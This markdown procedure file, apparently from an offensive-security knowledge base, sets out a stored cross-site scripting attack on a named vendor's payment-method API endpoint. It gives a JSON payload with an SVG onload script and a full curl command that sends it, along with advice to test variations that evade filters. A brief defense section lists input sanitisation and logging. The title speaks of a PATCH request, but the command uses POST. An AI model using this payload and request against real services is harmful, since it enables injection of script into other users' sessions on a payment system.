---
id: proc-inject-xss-001
tags:
  - xss
  - payload-injection
  - api-patch
type: procedure
tools:
  - '[[tools/Firefox-Browser]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/patch-payment-method-xss-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.331Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payload via PATCH Request

## Summary

This procedure exploits the lack of input sanitization in the 8x8 API's ipAddress field by sending a PATCH request to store a malicious JavaScript payload, setting the stage for stored XSS execution.

## Description

Target the /api/patchPaymentMethod/ID endpoint with a JSON payload containing an XSS script in ipAddress, such as an SVG onload handler. The endpoint accepts the input without validation, storing it for later retrieval. This requires an authenticated session and uses HTTP/2 with specific headers mimicking a browser request.

## Requirements

1. Authenticated API session with payment method access
2. Knowledge of the target payment method ID
3. Browser or HTTP client for request sending

## Defense

Defensive measures and detection strategies:

- Sanitize all inputs, especially non-standard fields like ipAddress
- Validate and escape user inputs before storage
- Log and alert on suspicious payloads in API requests

## Objectives

1. Store malicious JavaScript in the backend
2. Prepare for execution on victim views
3. Demonstrate persistence of the injection

## Instructions

### Step 1: Prepare the Payload

**Context**: Craft the JSON body with the XSS payload in ipAddress and a dummy callBackURL.

No command; define payload as {"ipAddress": "<svg on onload=(alert)(document.domain)>", "callBackURL":"dssdsd"}

> Ensure payload evades basic filters; test variations if needed.

### Step 2: Send the Injection Request

**Context**: Execute the PATCH request using browser dev tools or curl to inject the payload.

**Command** ([[commands/patch-payment-method-xss-injection]]):
```bash
curl -X POST https://example.8x8.com/api/patchPaymentMethod/ID \
  -H "Host: example.8x8.com" \
  -H "Cookie: ajs_anonymous_id=...; _gcl_au=..." \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,..." \
  -H "Content-Type: application/json" \
  -d '{"ipAddress": "<svg on onload=(alert)(document.domain)>", "callBackURL":"dssdsd"}'
```

> The request may return 400 Bad Request due to other validations, but the ipAddress update succeeds if no specific check exists.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/patch-payment-method-xss-injection]]

## Tools Used

- [[tools/Firefox-Browser]]

## Tags

- [[xss]]
- [[payload-injection]]
